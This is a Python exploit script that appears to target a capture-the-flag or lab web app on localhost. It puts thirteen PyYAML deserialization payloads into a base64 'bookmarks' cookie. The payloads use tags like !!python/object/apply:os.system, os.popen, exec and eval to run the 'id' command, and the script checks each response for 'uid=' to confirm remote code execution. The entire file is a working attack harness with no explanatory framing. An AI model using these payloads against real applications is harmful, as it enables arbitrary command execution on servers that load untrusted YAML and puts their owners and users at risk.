import requests
import base64

target = "http://127.0.0.1:32979"
session = requests.Session()
user_cookie = "f99d00962aa7465fa151128d2318d75d"
session.cookies.set("user", user_cookie, domain="127.0.0.1", path="/")

# Try payloads that maintain UrlObj structure while executing commands
test_payloads = [
    # Try to use exec in the name field somehow
    ("exec in url", """- !!python/object:app.models.UrlObj
  name: test
  url: !!python/object/apply:builtins.exec ["import os; os.system('id')"]
"""),

    # Try os.popen in url field
    ("popen in url", """- !!python/object:app.models.UrlObj  
  name: test
  url: !!python/object/new:os.popen ["id"]
"""),

    # Try to use getattr with formatting
    ("format with exec", """- !!python/object:app.models.UrlObj
  name: !!python/object/apply:builtins.str.format [{}, "import os; os.system('id')"]
  url: test
"""),

    # Nest exec in name
    ("str converter", """- !!python/object:app.models.UrlObj
  name: !!python/object/apply:builtins.str [!!python/object/apply:builtins.exec ["import os"]]
  url: test
"""),

    # Try to chain execution
    ("chain exec", """- !!python/object:app.models.UrlObj
  name: test
  url: !!python/object/apply:builtins.eval ["__import__('os').popen('id').read()"]
"""),

    # Using methodcaller
    ("methodcaller", """- !!python/object/new:operator.methodcaller
  args:
    - read
  - !!python/object/new:os.popen ["id"]
"""),

    # Partial application
    ("partial read on popen", """- !!python/object/new:functools.partial
  args:
    - !!python/object/new:operator.methodcaller ["read"]
    - !!python/object/new:os.popen ["id"]
"""),

    # Using __call__ on a custom object
    ("custom callable", """- !!python/object/new:builtins.type
  args:
    - X
    - (): !!python/tuple []
    - {"__call__": !!python/name:os.system}
  state: "id"
"""),

    # Pickle-like state injection
    ("state injection", """- !!python/object/new:app.models.UrlObj
  args:
    - injected
    - url
  state:
    - !!python/object/apply:os.system ["id"]
"""),

    # Default dict with factory
    ("defaultdict factory", """- !!python/object/new:collections.defaultdict
  args:
    - !!python/name:os.system
  state:
    - "id"
"""),

    # Using read on popen
    ("read call", """- !!python/object/apply:builtins.callable
  - !!python/object/new:os.popen ["id"]
"""),

    # Template injection via string
    ("template string", """- !!python/object/apply:builtins.str.__mod__
  - "%(cmd)s"
  - cmd: !!python/object/apply:os.popen ["id"]
"""),

    # Using pickletools to trigger
    ("pickletools", """- !!python/object/apply:pickletools.dis
  - !!python/object/new:os.popen ["id"]
"""),
]

print("Testing UrlObj-structured attacks...")
print("="*70)

for name, yaml_data in test_payloads:
    try:
        encoded = base64.b64encode(yaml_data.encode()).decode()
        session.cookies.set("bookmarks", encoded, domain="127.0.0.1", path="/")
        
        resp = session.get(target, timeout=10)
        status = resp.status_code
        
        has_rce = "uid=" in resp.text.lower()
        has_test = "test" in resp.text.lower()
        
        if has_rce:
            print(f"\n[RCE!] {name}")
            print(f"  Status: {status}")
            import re
            match = re.search(r'uid=[^<\n]+', resp.text)
            if match:
                print(f"  Output: {match.group()}")
            print(f"\n  Payload:\n{yaml_data}")
        elif status == 500:
            print(f"[BLOCK] {name}")
        elif has_test:
            print(f"[OK - test visible] {name} (Status: {status})")
        else:
            print(f"[BYPASS] {name} - Empty bookmark (Status: {status})")
            
    except Exception as e:
        print(f"[ERR] {name}: {str(e)}")

